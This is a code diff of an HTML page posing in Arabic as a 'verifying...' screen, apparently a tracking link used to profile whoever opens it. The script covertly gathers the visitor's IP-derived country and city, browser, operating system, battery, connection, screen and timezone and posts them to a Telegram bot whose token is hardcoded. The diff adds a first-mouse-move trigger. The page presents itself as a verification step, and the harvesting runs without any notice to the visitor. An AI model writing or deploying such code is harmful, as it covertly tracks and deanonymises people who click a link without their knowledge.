@@ -1,34 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>جارٍ التحقق...</title>
+  <meta charset="UTF-8" />
+  <title>جاري التحقق...</title>
   <script>
-    async function getData() {
+    let moved = false;
+
+    async function getExtraData() {
       const ref = new URLSearchParams(window.location.search).get("ref") || "غير_معروف";
-      const ipInfo = await fetch("https://api.ipify.org?format=json").then(res => res.json());
-      const device = navigator.userAgent;
-      const lang = navigator.language;
-      const platform = navigator.platform;
+
+      const ipInfo = await fetch("https://ipapi.co/json").then(res => res.json()).catch(() => ({}));
+      const battery = await navigator.getBattery?.().then(b => ({
+        level: `${Math.round(b.level * 100)}%`,
+        charging: b.charging ? "🔌 على الكهرباء" : "🔋 غير متصل"
+      })) || { level: "غير معروف", charging: "غير معروف" };
+
+      const connection = navigator.connection || {};
+      const connectionType = connection.effectiveType || "غير معروف";
+      const speedMbps = connection.downlink || "غير معروف";
+
+      const screenSize = `${screen.width}x${screen.height}`;
+      const language = navigator.language;
+      const os = navigator.platform;
+      const browser = navigator.userAgent;
+      const localTime = new Date().toLocaleString("ar-YE");
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const online = navigator.onLine ? "متصل" : "غير متصل";
-      const battery = await navigator.getBattery?.().then(b => `${Math.round(b.level * 100)}% ${b.charging ? '🔌' : '🔋'}`) || "غير مدعوم";
-      const time = new Date().toLocaleString();
 
       const message = `
 📥 تم دخول الرابط:
-
 🆔 المرجع: ${ref}
-🌐 IP: ${ipInfo.ip}
-📱 الجهاز: ${device}
-🌍 اللغة: ${lang}
-💻 النظام: ${platform}
-🔋 البطارية: ${battery}
-📶 الاتصال: ${online}
-🕒 الوقت: ${time}
+
+🔹 الدولة: ${ipInfo.country_name || "غير معروف"}
+🔹 المدينة: ${ipInfo.city || "غير معروف"}
+🔹 التوقيت المحلي: ${localTime}
+🔹 المنطقة الزمنية: ${timeZone}
+
+🖥️ الجهاز والمتصفح:
+🔸 نظام التشغيل: ${os}
+🔸 المتصفح: ${browser}
+🔸 اللغة: ${language}
+🔸 دقة الشاشة: ${screenSize}
+🔸 الوضع: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "مظلم" : "فاتح"}
+
+🔋 البطارية:
+🔸 الشحن: ${battery.level}
+🔸 ${battery.charging}
+
+📶 الاتصال:
+🔸 نوع الاتصال: ${connectionType}
+🔸 السرعة المقدرة: ${speedMbps} Mbps
+🔸 الحالة: ${online}
 `;
 
-      // إرسال البيانات للبوت الرئيسي
-      await fetch(`https://api.telegram.org/bot8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4/sendMessage`, {
+      await fetch("https://api.telegram.org/bot8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4/sendMessage", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -38,7 +63,11 @@
       });
     }
 
-    getData();
+    document.addEventListener("mousemove", async function onceMouseMoved() {
+      if (moved) return;
+      moved = true;
+      await getExtraData();
+    });
   </script>
 </head>
 <body>
